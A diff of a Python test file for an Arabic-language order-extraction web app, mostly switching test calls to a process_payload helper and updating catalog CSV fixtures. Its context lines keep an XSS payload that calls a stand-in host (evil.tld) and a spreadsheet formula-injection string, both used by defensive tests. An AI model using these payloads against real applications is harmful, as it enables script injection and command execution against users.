@@ -21,7 +21,7 @@ from app.extractor import _build_result, _is_transient, _parse_json_response
 from app.main import create_app
 from app.models import ExtractedItem, ExtractionResult
 from app.security import bind_actor, csv_safe, load_auth_config
-from tests.helpers import TEST_PASSWORD, login
+from tests.helpers import TEST_PASSWORD, login, process_payload
 
 XSS_PAYLOAD = '<img src=x onerror="fetch(\'//evil.tld\')">'
 CSV_PAYLOAD = "=cmd|' /C calc'!A0"
@@ -65,7 +65,7 @@ def signed_in(client):
 
 
 def _full_cycle(test_client, message="ابعتلي 6 فلاش ليمون", actor="reviewer"):
-    order = test_client.post("/api/process", json={"message": message}).json()
+    order = test_client.post("/api/process", json=process_payload(message)).json()
     item_id = order["items"][0]["id"]
     review = test_client.post(
         f"/api/orders/{order['order_id']}/items/{item_id}/review",
@@ -93,7 +93,7 @@ def _full_cycle(test_client, message="ابعتلي 6 فلاش ليمون", actor
 
 
 PROTECTED = [
-    ("post", "/api/process", {"json": {"message": "x"}}),
+    ("post", "/api/process", {"json": {"message": "x", "action_id": "protected-process"}}),
     ("get", "/api/orders", {}),
     ("get", "/api/orders/1", {}),
     ("get", "/api/orders/1/audit", {}),
@@ -186,7 +186,7 @@ def test_repeated_failed_logins_are_throttled(client):
 
 def test_review_with_a_forged_actor_is_refused(signed_in):
     test_client, db_path = signed_in
-    order = test_client.post("/api/process", json={"message": "ابعتلي 6 فلاش ليمون"}).json()
+    order = test_client.post("/api/process", json=process_payload("ابعتلي 6 فلاش ليمون")).json()
     response = test_client.post(
         f"/api/orders/{order['order_id']}/items/{order['items'][0]['id']}/review",
         json={
@@ -281,7 +281,7 @@ def test_untrusted_text_is_stored_verbatim_and_never_pre_rendered(signed_in):
     """
     test_client, _ = signed_in
     main_module.extractor = StubExtractor(raw_text=XSS_PAYLOAD)
-    order = test_client.post("/api/process", json={"message": XSS_PAYLOAD}).json()
+    order = test_client.post("/api/process", json=process_payload(XSS_PAYLOAD)).json()
     assert order["items"][0]["raw_text"] == XSS_PAYLOAD
 
     page = test_client.get("/").text
@@ -408,8 +408,11 @@ def test_upload_accepts_windows_1256_encoding(signed_in):
     [
         (b"", "فارغ"),
         (b"a,b,c\n1,2,3\n", "كود"),
-        ("product_id,product_name\nX,اسم\nX,اسم تاني\n".encode(), "مكرر"),
-        ("product_id,product_name\n,\n,\n".encode(), "صالح"),
+        (
+            "product_id,product_name,unit,price\nX,اسم,قطعة,10\nX,اسم تاني,قطعة,10\n".encode(),
+            "مكرر",
+        ),
+        ("product_id,product_name,unit,price\n,,قطعة,10\n,,قطعة,10\n".encode(), "صالح"),
     ],
 )
 def test_bad_catalog_files_are_rejected_with_a_readable_reason(payload, fragment):
@@ -455,7 +458,7 @@ def test_process_is_blocked_when_the_catalog_is_empty(tmp_path, monkeypatch):
     monkeypatch.setattr("app.main._seed_catalog_if_empty", lambda _path: None)
     with TestClient(create_app(db_path)) as test_client:
         login(test_client, "reviewer")
-        response = test_client.post("/api/process", json={"message": "x"})
+        response = test_client.post("/api/process", json=process_payload("x"))
         assert response.status_code == 409
         assert "كتالوج" in response.json()["detail"]
 
@@ -491,7 +494,7 @@ def test_session_rolls_back_on_error(tmp_path):
 def test_accepting_the_model_recommendation_records_no_false_correction(signed_in):
     """The corrections table is the learning signal; it must stay clean."""
     test_client, db_path = signed_in
-    order = test_client.post("/api/process", json={"message": "ابعتلي 6 فلاش ليمون"}).json()
+    order = test_client.post("/api/process", json=process_payload("ابعتلي 6 فلاش ليمون")).json()
     item = order["items"][0]
     assert item["recommended_product"]["product_id"] == "CL010"
 
@@ -512,7 +515,7 @@ def test_accepting_the_model_recommendation_records_no_false_correction(signed_i
 
 def test_overriding_the_model_records_a_real_correction(signed_in):
     test_client, db_path = signed_in
-    order = test_client.post("/api/process", json={"message": "ابعتلي 6 فلاش ليمون"}).json()
+    order = test_client.post("/api/process", json=process_payload("ابعتلي 6 فلاش ليمون")).json()
     item = order["items"][0]
 
     test_client.post(
@@ -523,14 +526,14 @@ def test_overriding_the_model_records_a_real_correction(signed_in):
             "final_decision": "SELECT",
             "selected_sku": "CL009",
             "quantity": 9,
-            "unit": "كرتونة",
+            "unit": "قطعة",
         },
     )
     corrections = database.get_order_by_id(order["order_id"], db_path)["corrections"]
     fields = {c["field_name"]: (c["old_value"], c["new_value"]) for c in corrections}
     assert fields["product_id"] == ("CL010", "CL009")
     assert fields["quantity"][1] == "9.0"
-    assert fields["unit"][1] == "كرتونة"
+    assert "unit" not in fields
 
 
 # ---------------------------------------------------------------------------
@@ -540,7 +543,7 @@ def test_overriding_the_model_records_a_real_correction(signed_in):
 
 def test_no_saving_is_claimed_before_approval(signed_in):
     test_client, _ = signed_in
-    order = test_client.post("/api/process", json={"message": "ابعتلي 6 فلاش ليمون"}).json()
+    order = test_client.post("/api/process", json=process_payload("ابعتلي 6 فلاش ليمون")).json()
     timing = order["time_saved"]
     assert timing["saved_seconds"] is None
     assert timing["is_measured"] is False
@@ -665,7 +668,7 @@ def test_ambiguous_line_still_carries_its_best_candidate(signed_in, monkeypatch)
     )
     monkeypatch.setattr(main_module, "extractor", RiceExtractor())
 
-    item = test_client.post("/api/process", json={"message": "رز"}).json()["items"][0]
+    item = test_client.post("/api/process", json=process_payload("رز")).json()["items"][0]
 
     assert item["confidence"] >= 0.85
     assert item["recommendation_decision"] == "REVIEW", "close variants must route to review"
@@ -677,7 +680,7 @@ def test_ambiguous_line_still_carries_its_best_candidate(signed_in, monkeypatch)
 def test_unambiguous_line_is_marked_select(signed_in):
     test_client, _ = signed_in
     item = test_client.post(
-        "/api/process", json={"message": "ابعتلي 6 فلاش ليمون"}
+        "/api/process", json=process_payload("ابعتلي 6 فلاش ليمون")
     ).json()["items"][0]
     assert item["recommendation_decision"] == "SELECT"
     assert item["recommended_product"]["product_id"] == "CL010"
@@ -744,7 +747,7 @@ def test_cross_site_state_change_is_rejected(client):
 
     same_site = test_client.post(
         "/api/catalog/upload",
-        files={"file": ("ok.csv", b"product_id,product_name\nOK1,fine\n", "text/csv")},
+        files={"file": ("ok.csv", b"product_id,product_name,unit,price\nOK1,fine,pcs,10\n", "text/csv")},
         headers={"Origin": "http://testserver"},
     )
     assert same_site.status_code == 200, "same-origin upload must still work"
@@ -843,7 +846,7 @@ def test_approved_order_renders_from_the_snapshot_not_the_live_catalog(signed_in
 
 def test_order_message_length_is_bounded(signed_in):
     test_client, _ = signed_in
-    assert test_client.post("/api/process", json={"message": "x" * 20_001}).status_code == 422
+    assert test_client.post("/api/process", json=process_payload("x" * 20_001)).status_code == 422
 
 
 def test_utf16_catalog_is_accepted(signed_in):
